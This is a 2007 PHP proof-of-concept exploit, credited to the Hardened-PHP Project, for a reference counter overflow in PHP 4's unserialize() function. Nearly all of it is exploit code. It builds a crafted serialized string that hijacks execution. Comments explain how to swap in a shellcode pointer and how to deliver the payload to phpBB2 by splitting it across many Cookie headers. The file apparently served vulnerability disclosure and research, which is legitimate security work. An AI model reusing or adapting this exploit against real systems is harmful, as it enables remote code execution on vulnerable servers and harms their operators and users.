<?php
  ////////////////////////////////////////////////////////////////////////
  //  _  _                _                     _       ___  _  _  ___  //
  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
  //                                                                    //
  //         Proof of concept code from the Hardened-PHP Project        //
  //                   (C) Copyright 2007 Stefan Esser                  //
  //                                                                    //
  ////////////////////////////////////////////////////////////////////////
  //           PHP 4 - unserialize() Reference Counter Overflow         //
  ////////////////////////////////////////////////////////////////////////

  // This is meant as a protection against remote file inclusion.
  die("REMOVE THIS LINE");
  
  // This exploit is only designed for linux x86 systems
  // where 0x08064058 is a readable address in the PHP process 
  // (should be unless binary images are relocated default systems)
  // 
  // The exploit does nothing useful. It just proves that the CPU
  // will try to execute the instruction at 0x99887766 which results
  // in a crash. Just replace it with a pointer to your shellcode and
  // it will work.
  //
  // To exploit phpBB2 with this you need to put a similar string
  // into the cookie. You must work around the size limit of HTTP
  // headers by using MANY Cookie: headers (not folded lines, real
  // headers). Additionally you must put at the end of ever line
  // a line terminator s:2:" and start every following line with
  // ";N; of course with URL encoded ';'

  $hashtable = str_repeat("A", 39);
  
  $hashtable[5*4+0]=chr(0x58);
  $hashtable[5*4+1]=chr(0x40);
  $hashtable[5*4+2]=chr(0x06);
  $hashtable[5*4+3]=chr(0x08);
  
  $hashtable[8*4+0]=chr(0x66);
  $hashtable[8*4+1]=chr(0x77);
  $hashtable[8*4+2]=chr(0x88);
  $hashtable[8*4+3]=chr(0x99);

  $str = 'a:100000:{s:8:"AAAABBBB";a:3:{s:12:"0123456789AA";a:1:{s:12:"AAAABBBBCCCC";i:0;}s:12:"012345678AAA";i:0;s:12:"012345678BAN";i:0;}';
  for ($i=0; $i<65535; $i++) {
    $str .= 'i:0;R:2;';
  }
  $str .= 's:39:"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";s:39:"'.$hashtable.'";i:0;R:3;';

  unserialize($str);

?>